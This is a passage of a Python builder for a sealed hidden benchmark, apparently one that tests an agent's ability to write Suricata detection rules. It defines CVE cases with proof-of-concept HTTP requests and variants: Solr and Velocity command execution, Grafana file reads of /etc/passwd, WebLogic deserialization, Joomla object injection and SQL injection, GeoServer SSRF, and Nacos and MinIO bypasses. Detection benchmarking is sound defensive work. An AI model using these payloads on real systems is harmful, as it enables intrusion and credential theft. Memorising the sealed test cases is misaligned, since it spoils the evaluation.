            "POST full-import form data with a script-bearing dataConfig to /solr/<core>/dataimport.",
            sample("original", request("POST", "/solr/demo/dataimport?indent=on&wt=json", headers=form_headers, body=_solr_dih("touch /tmp/hidden")), response('{"status":"idle"}', content_type="application/json"), "script transformer executes command"),
            (
                sample("positive-01", request("POST", "/solr/demo/dataimport?wt=json&indent=on", headers=form_headers, body=_solr_dih("id")), response('{"status":"idle"}', content_type="application/json"), "different command and query order"),
                sample("positive-02", request("POST", "/solr/products/dataimport?indent=on&wt=json", headers=form_headers, body=_solr_dih("whoami").replace("core=demo", "core=products")), response('{"status":"idle"}', content_type="application/json"), "different core and command"),
            ),
            (
                sample("negative-01", request("POST", "/solr/demo/dataimport?indent=on&wt=json", headers=form_headers, body="command=status&core=demo&name=dataimport"), response('{"status":"idle"}', content_type="application/json"), "normal DataImport status command"),
                sample("negative-02", request("POST", "/solr/demo/update", headers=form_headers, body=_solr_dih("id")), response("invalid", status=400, reason="Bad Request"), "dataConfig outside DataImportHandler"),
            ),
        ),
        CaseDefinition(
            "CVE-2019-17558",
            "velocity_template_rce",
            "Apache Solr 5.0.0 through 8.3.1 can execute attacker-provided Velocity templates when the parameter resource loader is enabled on a core.",
            "Request /solr/<core>/select with wt=velocity and a malicious v.template.custom value.",
            sample("original", request("GET", _velocity_target("demo", "id")), response("uid=8983(solr)\n"), "Velocity template executes id"),
            (
                sample("positive-01", request("GET", _velocity_target("demo", "whoami")), response("solr\n"), "different command"),
                sample("positive-02", request("GET", _velocity_target("products", "uname -a", lower_escapes=True)), response("Linux benchmark\n"), "different core and lowercase percent escapes"),
            ),
            (
                sample("negative-01", request("GET", "/solr/demo/select?q=title:benchmark&wt=json"), response('{"response":{"numFound":0}}', content_type="application/json"), "normal Solr query"),
                sample("negative-02", request("GET", "/search?wt=velocity&v.template.custom=" + quote("#set($x='')", safe="")), response("no results", content_type="text/html"), "Velocity parameters outside Solr core route"),
            ),
        ),
        CaseDefinition(
            "CVE-2024-9264",
            "sql_expression_file_read_rce",
            "Grafana 11.0.0 through affected 11.2 releases exposes DuckDB SQL Expressions through /api/ds/query, allowing authenticated users to read local files and, in some versions, execute commands.",
            "POST an __expr__ SQL query using read_blob or shellfs to /api/ds/query.",
            sample("original", request("POST", grafana_target, headers={**json_headers,"Authorization":"Basic YWRtaW46YWRtaW4="}, body=_grafana_query("SELECT content FROM read_blob('/etc/passwd')")), response('{"results":{"A":{"frames":[]}}}', content_type="application/json"), "DuckDB read_blob reads passwd"),
            (
                sample("positive-01", request("POST", grafana_target.replace("Q100", "Q200"), headers={**json_headers,"Authorization":"Basic YWRtaW46YWRtaW4="}, body=_grafana_query("SELECT content FROM read_blob('/etc/hosts')")), response('{"results":{"A":{"frames":[]}}}', content_type="application/json"), "different file target"),
                sample("positive-02", request("POST", "/api/ds/query?expression=true&requestId=Q300&ds_type=__expr__", headers={"Authorization":"Basic YWRtaW46YWRtaW4=",**json_headers}, body=_grafana_query("SELECT 1; INSTALL shellfs FROM community", pretty=True)), response('{"results":{"A":{"frames":[]}}}', content_type="application/json"), "shellfs RCE stage with query and JSON reordering"),
            ),
            (
                sample("negative-01", request("POST", grafana_target, headers={**json_headers,"Authorization":"Basic YWRtaW46YWRtaW4="}, body=_grafana_query("SELECT 1 + 1")), response('{"results":{"A":{"frames":[]}}}', content_type="application/json"), "normal SQL expression"),
                sample("negative-02", request("POST", "/api/query?ds_type=__expr__&expression=true", headers=json_headers, body=_grafana_query("SELECT content FROM read_blob('/etc/passwd')")), not_found, "malicious SQL outside datasource query API"),
            ),
        ),
        CaseDefinition(
            "CVE-2017-10271",
            "xmldecoder_deserialization",
            "Oracle WebLogic wls-wsat WorkContext accepts attacker-controlled XMLDecoder objects, allowing unauthenticated process execution or arbitrary file writes.",
            "POST a SOAP WorkContext containing java.beans.XMLDecoder to CoordinatorPortType.",
            sample("original", request("POST", "/wls-wsat/CoordinatorPortType", headers=xml_headers, body=_weblogic_xml("id")), response("fault", status=500, reason="Internal Server Error", content_type="text/xml"), "XMLDecoder ProcessBuilder execution"),
            (
                sample("positive-01", request("POST", "/wls-wsat/CoordinatorPortType", headers=xml_headers, body=_weblogic_xml("whoami")), response("fault", status=500, reason="Internal Server Error", content_type="text/xml"), "different command"),
                sample("positive-02", request("POST", "/wls-wsat/RegistrationPortTypeRPC", headers=xml_headers, body=_weblogic_xml("ignored", writer=True)), response("fault", status=500, reason="Internal Server Error", content_type="text/xml"), "alternate wls-wsat port and PrintWriter gadget"),
            ),
            (
                sample("negative-01", request("POST", "/wls-wsat/CoordinatorPortType", headers=xml_headers, body='<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body/></soapenv:Envelope>'), response("ok", content_type="text/xml"), "normal SOAP envelope"),
                sample("negative-02", request("POST", "/services/CoordinatorPortType", headers=xml_headers, body=_weblogic_xml("id")), not_found, "XMLDecoder body outside wls-wsat"),
            ),
        ),
        CaseDefinition(
            "CVE-2015-8562",
            "http_header_object_injection",
            "Joomla 1.5.0 through 3.4.5 stores attacker-controlled HTTP headers in a session row and can deserialize a crafted PHP object graph terminated by a four-byte UTF-8 character.",
            "Send a serialized Joomla gadget chain in User-Agent with the victim session cookie.",
            sample("original", request("GET", "/", headers={"Cookie":"session=benchmark","User-Agent":'123}__test|O:21:"JDatabaseDriverMysqli":1:{s:4:"code";s:10:"phpinfo();";}𝌆'}), response("phpinfo", content_type="text/html"), "serialized object graph in User-Agent"),
            (
                sample("positive-01", request("GET", "/index.php", headers={"Cookie":"session=another","User-Agent":'123}__test|O:21:"JDatabaseDriverMysqli":1:{s:4:"code";s:7:"echo 1;";}𝌆'}), response("1", content_type="text/html"), "different session and code"),
                sample("positive-02", request("GET", "/?option=com_content", headers={"User-Agent":'123}__test|O:9:"SimplePie":1:{s:8:"feed_url";s:7:"echo 2;";}𝌆',"Cookie":"session=third"}), response("2", content_type="text/html"), "different gadget class and header ordering"),
            ),
            (
                sample("negative-01", request("GET", "/", headers={"Cookie":"session=benchmark","User-Agent":"Mozilla/5.0"}), response("home", content_type="text/html"), "normal browser User-Agent"),
                sample("negative-02", request("GET", "/", headers={"Cookie":"session=benchmark","X-Debug":'O:21:"JDatabaseDriverMysqli":1:{s:4:"code";s:2:"id";}'}), response("home", content_type="text/html"), "serialized text in an unrelated header"),
            ),
        ),
        CaseDefinition(
            "CVE-2017-8917",
            "component_sqli",
            "Joomla 3.7.0 com_fields passes list[fullordering] into a database query, permitting unauthenticated SQL injection.",
            "Supply an updatexml or equivalent SQL expression in list[fullordering] on the com_fields modal view.",
            sample("original", request("GET", "/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,user()),1)"), response("database error", status=500, reason="Internal Server Error"), "updatexml SQL injection"),
            (
                sample("positive-01", request("GET", "/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=extractvalue(1,concat(0x7e,database()))"), response("database error", status=500, reason="Internal Server Error"), "different error-based SQL function"),
                sample("positive-02", request("GET", "/index.php?layout=modal&view=fields&option=com_fields&list%5Bfullordering%5D=updatexml(1,concat(0x7e,version()),1)"), response("database error", status=500, reason="Internal Server Error"), "encoded parameter and query reordering"),
            ),
            (
                sample("negative-01", request("GET", "/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=title+ASC"), response("fields", content_type="text/html"), "normal field ordering"),
                sample("negative-02", request("GET", "/index.php?option=com_content&list[fullordering]=updatexml(1,version(),1)"), response("articles", content_type="text/html"), "SQL text outside com_fields"),
            ),
        ),
        CaseDefinition(
            "CVE-2023-25157",
            "ogc_filter_sqli",
            "GeoServer before 2.22.1 and 2.21.4 permits SQL injection through OGC filter function expressions used by WFS GetFeature requests against database-backed layers.",
            "Send a CQL_FILTER containing a crafted function argument and SQL subquery to /geoserver/ows.",
            sample("original", request("GET", "/geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName=vulhub:example&CQL_FILTER=strStartsWith%28name%2C%27x%27%27%29%3Dtrue+and+1%3D%28SELECT+CAST%28%28SELECT+version%28%29%29+AS+integer%29%29--"), response("SQL error", status=500, reason="Internal Server Error"), "WFS CQL function SQL injection"),
            (
                sample("positive-01", request("GET", "/geoserver/ows?service=WFS&request=GetFeature&version=1.0.0&typeName=vulhub:example&CQL_FILTER=strEndsWith%28name%2C%27x%27%27%29%3Dtrue+and+1%3D%28SELECT+CAST%28current_user+AS+integer%29%29--"), response("SQL error", status=500, reason="Internal Server Error"), "different vulnerable function and expression"),
                sample("positive-02", request("GET", "/geoserver/wfs?request=GetFeature&service=WFS&typeName=vulhub:example&version=2.0.0&CQL_FILTER=strStartsWith%28name%2C%27a%27%27%29%3Dtrue%20and%201%3D%28SELECT%20CAST%28database%28%29%20AS%20integer%29%29--"), response("SQL error", status=500, reason="Internal Server Error"), "alternate WFS path and encoding"),
            ),
            (
                sample("negative-01", request("GET", "/geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName=vulhub:example&CQL_FILTER=name%3D%27benchmark%27"), response("features", content_type="application/xml"), "normal CQL equality filter"),
                sample("negative-02", request("GET", "/api/search?CQL_FILTER=strStartsWith%28name%2C%27x%27%27%29+and+SELECT+version%28%29"), response("no results", content_type="application/json"), "CQL-like text outside GeoServer WFS"),
            ),
        ),
        CaseDefinition(
            "CVE-2021-40822",
            "wfs_post_ssrf",
            "GeoServer before the fixed 2.17/2.18/2.19 releases exposes TestWfsPost, which accepts an attacker-controlled url and makes a server-side HTTP request.",
            "POST form data containing an absolute url to /geoserver/TestWfsPost.",
            sample("original", request("POST", "/geoserver/TestWfsPost", headers={**form_headers,"Host":"internal"}, body="form_hf_0=&url=http%3A%2F%2Finternal%2Fadmin&body=test&username=admin&password=admin"), response("internal admin", content_type="text/html"), "server-side request to internal URL"),
            (
                sample("positive-01", request("POST", "/geoserver/TestWfsPost", headers={**form_headers,"Host":"metadata"}, body="url=http%3A%2F%2Fmetadata%2Flatest%2Fmeta-data&body=&username=&password="), response("instance-id\n"), "different target and GET-style body"),
                sample("positive-02", request("POST", "/geoserver/TestWfsPost", headers={"Host":"internal",**form_headers}, body="password=&username=&body=probe&url=https%3A%2F%2Finternal%2Fmetrics&form_hf_0="), response("requests_total 42\n"), "HTTPS target and form reordering"),
            ),
            (
                sample("negative-01", request("POST", "/geoserver/TestWfsPost", headers={**form_headers,"Host":"internal"}, body="form_hf_0=&url=%2Fgeoserver%2Fows&body=&username=&password="), response("local form", content_type="text/html"), "relative local URL rather than SSRF target"),
                sample("negative-02", request("POST", "/geoserver/SubmitWfs", headers={**form_headers,"Host":"internal"}, body="url=http%3A%2F%2Finternal%2Fadmin&body=test"), not_found, "absolute URL on another endpoint"),
            ),
        ),
        CaseDefinition(
            "CVE-2021-29441",
            "user_agent_auth_bypass",
            "Nacos before 1.4.1 trusts the hard-coded User-Agent value Nacos-Server as an internal request and skips authentication on protected APIs.",
            "Request a protected /nacos/v1/auth endpoint with User-Agent: Nacos-Server.",
            sample("original", request("GET", "/nacos/v1/auth/users?pageNo=1&pageSize=9", headers={"User-Agent":"Nacos-Server"}), response('{"pageItems":[{"username":"nacos"}]}', content_type="application/json"), "spoofed internal User-Agent lists users"),
            (
                sample("positive-01", request("POST", "/nacos/v1/auth/users?username=hidden&password=hidden", headers={"User-Agent":"Nacos-Server"}), response("create user ok!"), "same bypass performs protected write"),
                sample("positive-02", request("GET", "/nacos/v1/auth/roles?pageNo=1&pageSize=10", headers={"user-agent":"Nacos-Server","Accept":"application/json"}), response('{"pageItems":[]}', content_type="application/json"), "different protected API and header casing"),
            ),
            (
                sample("negative-01", request("GET", "/nacos/v1/auth/users?pageNo=1&pageSize=9", headers={"User-Agent":"Mozilla/5.0"}), protected, "protected API without spoofed identity"),
                sample("negative-02", request("GET", "/nacos/v1/ns/instance/list?serviceName=demo", headers={"User-Agent":"Nacos-Server"}), response('{"hosts":[]}', content_type="application/json"), "internal User-Agent on a non-auth management route"),
            ),
        ),
        CaseDefinition(
            "CVE-2023-23752",
            "webservice_access_bypass",
            "Joomla 4.0.0 through 4.2.7 permits unauthenticated webservice access when public=true overwrites an authorization attribute on selected API endpoints.",
            "Request a sensitive /api/index.php/v1 endpoint with public=true.",
            sample("original", request("GET", "/api/index.php/v1/config/application?public=true"), response('{"data":{"db":"joomla","user":"root"}}', content_type="application/json"), "public flag exposes configuration"),
            (
                sample("positive-01", request("GET", "/api/index.php/v1/users?public=true"), response('{"data":[{"email":"admin@example.invalid"}]}', content_type="application/json"), "public flag exposes users"),
                sample("positive-02", request("GET", "/api/index.php/v1/config/application?format=json&public=1"), response('{"data":{"db":"joomla"}}', content_type="application/json"), "numeric true representation and query reordering"),
            ),
            (
                sample("negative-01", request("GET", "/api/index.php/v1/config/application"), protected, "same sensitive endpoint without bypass flag"),
                sample("negative-02", request("GET", "/index.php?option=com_content&public=true"), response("articles", content_type="text/html"), "public parameter outside Joomla webservice API"),
            ),
        ),
        CaseDefinition(
            "CVE-2023-28432",
            "bootstrap_information_disclosure",
            "Cluster-mode MinIO before RELEASE.2023-03-20T20-16-18Z exposes process environment variables to unauthenticated POST requests at the bootstrap verify endpoint.",
            "POST an empty request to /minio/bootstrap/v1/verify.",
            sample("original", request("POST", "/minio/bootstrap/v1/verify", headers=form_headers), response('{"MINIO_ROOT_USER":"minioadmin","MINIO_ROOT_PASSWORD":"minioadmin"}', content_type="application/json"), "bootstrap verify discloses credentials"),
            (
                sample("positive-01", request("POST", "/minio/bootstrap/v1/verify?region=us-east-1", headers=form_headers), response('{"MINIO_ROOT_USER":"root","MINIO_ROOT_PASSWORD":"secret"}', content_type="application/json"), "benign query string does not change disclosure"),
                sample("positive-02", request("POST", "/minio/bootstrap/v1/verify", headers={"Accept":"application/json","Content-Type":"application/x-www-form-urlencoded","X-Forwarded-For":"198.51.100.44"}), response('{"MINIO_ROOT_USER":"admin","MINIO_ROOT_PASSWORD":"hidden"}', content_type="application/json"), "header variation"),
            ),
            (
                sample("negative-01", request("GET", "/minio/bootstrap/v1/verify"), response("method not allowed", status=405, reason="Method Not Allowed"), "wrong method"),
                sample("negative-02", request("POST", "/minio/bootstrap/v1/status", headers=form_headers), not_found, "nearby non-vulnerable endpoint"),
            ),
        ),
    )


PROVENANCE = {
    "CVE-2021-42013": "httpd/CVE-2021-42013/README.md",
    "CVE-2015-3337": "elasticsearch/CVE-2015-3337/README.md",
    "CVE-2015-5531": "elasticsearch/CVE-2015-5531/README.md",
    "CVE-2018-17246": "kibana/CVE-2018-17246/README.md",
    "CVE-2021-34429": "jetty/CVE-2021-34429/README.md",
    "CVE-2010-2861": "coldfusion/CVE-2010-2861/README.md",
    "CVE-2019-3396": "confluence/CVE-2019-3396/README.md",
    "CVE-2022-26134": "confluence/CVE-2022-26134/README.md",
    "CVE-2023-22527": "confluence/CVE-2023-22527/README.md",
    "CVE-2018-7602": "drupal/CVE-2018-7602/README.md",
    "CVE-2019-7609": "kibana/CVE-2019-7609/README.md",
    "CVE-2023-41892": "craftcms/CVE-2023-41892/README.md",
    "CVE-2020-14882": "weblogic/CVE-2020-14882/README.md",
    "CVE-2017-12615": "tomcat/CVE-2017-12615/README.md",
    "CVE-2022-22963": "spring/CVE-2022-22963/README.md",
    "CVE-2022-22947": "spring/CVE-2022-22947/README.md",
    "CVE-2017-8046": "spring/CVE-2017-8046/README.md",
    "CVE-2021-3129": "laravel/CVE-2021-3129/README.md",
    "CVE-2019-10758": "mongo-express/CVE-2019-10758/README.md",
    "CVE-2019-0193": "solr/CVE-2019-0193/README.md",
    "CVE-2019-17558": "solr/CVE-2019-17558/README.md",
    "CVE-2024-9264": "grafana/CVE-2024-9264/README.md",
    "CVE-2017-10271": "weblogic/CVE-2017-10271/README.md",
    "CVE-2015-8562": "joomla/CVE-2015-8562/README.md",
    "CVE-2017-8917": "joomla/CVE-2017-8917/README.md",
    "CVE-2023-25157": "geoserver/CVE-2023-25157/README.md",
    "CVE-2021-40822": "geoserver/CVE-2021-40822/README.md",
    "CVE-2021-29441": "nacos/CVE-2021-29441/README.md",
    "CVE-2023-23752": "joomla/CVE-2023-23752/README.md",
    "CVE-2023-28432": "minio/CVE-2023-28432/README.md",
}


def _write_json(path: Path, value: object) -> None:
    path.write_text(
        json.dumps(value, ensure_ascii=False, indent=2) + "\n",
        encoding="utf-8",
    )


def _sha256(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for chunk in iter(lambda: handle.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()


def build(output_root: Path) -> dict[str, Any]:
    if output_root.exists():
        raise ValueError(f"Refusing to overwrite sealed hidden test: {output_root}")
    case_definitions = definitions()
    if len(case_definitions) != 30 or len({case.case_id for case in case_definitions}) != 30:
        raise ValueError("hidden-test-v1 must contain 30 unique CVEs")
    dev_ids = {
        item["case_id"]
        for item in json.loads(
            (PROJECT_DIR / "benchmarks" / "v0-manifest.json").read_text("utf-8")
        )["cases"]
    }
    overlap = sorted(dev_ids & {case.case_id for case in case_definitions})
    if overlap:
        raise ValueError("hidden cases overlap dev set: " + ", ".join(overlap))

    cases_root = output_root / "sealed-cases"
    cases_root.mkdir(parents=True)
    manifest_cases: list[dict[str, Any]] = []
    for case in case_definitions:
        case_root = cases_root / case.case_id
        pcaps_root = case_root / "pcaps"
        pcaps_root.mkdir(parents=True)
        _write_json(
            case_root / "input.json",
            {
                "version": 1,
                "case_id": case.case_id,
                "family": case.family,
                "description": case.description,
                "poc": case.poc,
                "poc_http": render_request(case.original.request),
                "response_http": render_response(case.original.response),
            },
        )
        positives = (case.original, *case.positives)
        negatives = case.negatives
        _write_json(
            case_root / "oracle.json",
            {
                "version": 1,
                "case_id": case.case_id,
                "positive": [
                    {
                        "name": item.name,
                        "kind": "original" if item.name == "original" else "variant",
                        "pcap": f"pcaps/{item.name}.pcap",
                        "reason": item.reason,
                    }
                    for item in positives
                ],
                "negative": [
                    {
                        "name": item.name,
                        "kind": "negative",
                        "pcap": f"pcaps/{item.name}.pcap",
                        "reason": item.reason,
                    }
                    for item in negatives
                ],
            },
        )
        for item in (*positives, *negatives):
            generate_pcap(
                str(pcaps_root / f"{item.name}.pcap"),
                render_request(item.request),
                render_response(item.response),
            )
        manifest_cases.append(
            {
                "case_id": case.case_id,
                "family": case.family,
                "path": f"sealed-cases/{case.case_id}",
                "split": "test",
                "positive_count": 3,
                "negative_count": 2,
                "has_reference_rule": False,
                "provenance": {
                    "repository": VULHUB_REPOSITORY,
                    "commit": VULHUB_COMMIT,
                    "path": PROVENANCE[case.case_id],
                },
            }
        )

    public_manifest = {
        "version": 1,
        "name": "suricataagent-hidden-test-v1",
        "split": "test",
        "sealed": True,
        "case_count": 30,
        "pcap_count": 150,
        "model_visible_file": "input.json",
        "evaluator_only_files": ["oracle.json", "pcaps/*", "reference.rules"],
        "cases": manifest_cases,
    }
    _write_json(output_root / "manifest.public.json", public_manifest)
    runner_manifest = {**public_manifest, "split": "dev", "name": "hidden-test-v1-runner-view"}
    _write_json(output_root / "manifest.runner.json", runner_manifest)

    asset_hashes = [
        {
            "path": path.relative_to(output_root).as_posix(),
            "sha256": _sha256(path),
            "bytes": path.stat().st_size,
        }
        for path in sorted(cases_root.rglob("*"))
        if path.is_file()
    ]
    sealed_manifest = {
        "version": 1,
        "name": "suricataagent-hidden-test-v1-sealed-assets",
        "public_manifest_sha256": _sha256(output_root / "manifest.public.json"),
        "runner_manifest_sha256": _sha256(output_root / "manifest.runner.json"),
        "case_count": 30,
        "pcap_count": 150,
        "assets": asset_hashes,
    }
    _write_json(output_root / "sealed-assets-manifest.json", sealed_manifest)
    return public_manifest


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--output", type=Path, default=DEFAULT_ROOT)
    args = parser.parse_args()
    manifest = build(args.output.resolve())
    print(json.dumps({"cases": manifest["case_count"], "pcaps": manifest["pcap_count"]}))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
